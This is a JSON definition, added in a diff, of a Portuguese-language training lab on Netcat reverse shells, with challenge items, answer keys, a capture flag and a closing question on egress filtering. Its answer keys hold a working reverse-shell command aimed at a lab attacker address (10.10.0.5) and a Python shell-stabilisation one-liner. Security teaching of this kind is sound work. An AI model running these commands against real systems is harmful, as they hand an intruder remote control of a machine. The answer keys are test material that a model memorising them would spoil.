@@ -1,0 +1,55 @@
+{
+  "labTitle": "Laboratório: Reverse Shell com Netcat",
+  "introduction": "Uma 'Reverse Shell' (Shell Reversa) ocorre quando o computador alvo se conecta de volta à máquina do atacante. Isso é extremamente útil para contornar firewalls que bloqueiam conexões de entrada, mas permitem conexões de saída. O Netcat (nc) é a ferramenta suíça para criar essas conexões.",
+  "objective": "Seu objetivo é configurar um 'ouvinte' (listener) na sua máquina e simular a execução de um comando no alvo que entrega o controle do terminal para você.",
+  "xp": 80,
+  "steps": [
+    {
+      "id": 1,
+      "type": "INFO",
+      "title": "Passo 1: Preparando o Listener",
+      "description": "Primeiro, o atacante deve preparar sua máquina para receber a conexão. Usamos o Netcat em modo de escuta (listen):\n\n```bash\nnc -lvnp 4444\n```\nAs flags significam: \n- `l`: Listen (escutar)\n- `v`: Verbose (detalhado)\n- `n`: Numeric (não resolver DNS)\n- `p`: Port (porta 4444)"
+    },
+    {
+      "id": 2,
+      "type": "INPUT_CHALLENGE",
+      "title": "Passo 2: O Gatilho no Alvo",
+      "description": "Agora, imagine que você tem execução de comandos no alvo. Qual comando Netcat você executaria no alvo (Linux) para enviar uma shell `/bin/bash` de volta para o seu IP `10.10.0.5` na porta `4444`?",
+      "placeholder": "nc 10.10.0.5 ... -e /bin/bash",
+      "correctAnswer": "nc 10.10.0.5 4444 -e /bin/bash",
+      "successMessage": "Conexão estabelecida! Você agora tem um prompt de comando remoto.",
+      "failureMessage": "Verifique a ordem: IP, depois Porta, e então a flag -e para o executável."
+    },
+    {
+      "id": 3,
+      "type": "INPUT_CHALLENGE",
+      "title": "Passo 3: Estabilização",
+      "description": "Shells do Netcat costumam ser instáveis e não suportam comandos como 'clear' ou setas do teclado. Uma forma comum de obter uma shell melhor é usando Python. Qual comando Python você usaria para 'spawnar' uma shell pty?",
+      "placeholder": "python3 -c 'import pty; ...'",
+      "correctAnswer": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "successMessage": "Shell estabilizada! Você capturou a flag: CP{n3tcat_sh3ll_established}",
+      "failureMessage": "Use o módulo 'pty' e a função 'spawn'."
+    },
+    {
+      "id": 4,
+      "type": "MULTIPLE_CHOICE",
+      "title": "Passo 4: Prevenção",
+      "description": "Qual medida de segurança de rede é mais eficaz para detectar ou bloquear shells reversas?",
+      "options": [
+        "Bloquear todas as conexões de entrada (Inbound).",
+        "Implementar Egress Filtering (filtragem de saída) para permitir conexões apenas em portas e destinos conhecidos.",
+        "Mudar a senha do root.",
+        "Desinstalar o Python."
+      ],
+      "correctAnswer": "Implementar Egress Filtering (filtragem de saída) para permitir conexões apenas em portas e destinos conhecidos.",
+      "explanation": "Shells reversas dependem de conexões de SAÍDA do servidor para o atacante. Se o servidor estiver configurado para só falar com serviços confiáveis na internet, o 'call home' da shell será bloqueado pelo firewall."
+    },
+    {
+      "id": 5,
+      "type": "COMPLETION",
+      "title": "Conclusão",
+      "description": "Você dominou o conceito de Shell Reversa e estabilização de terminal. Este é um passo crucial em quase todo teste de intrusão bem-sucedido.",
+      "successMessage": "Laboratório de Reverse Shell concluído!"
+    }
+  ]
+}
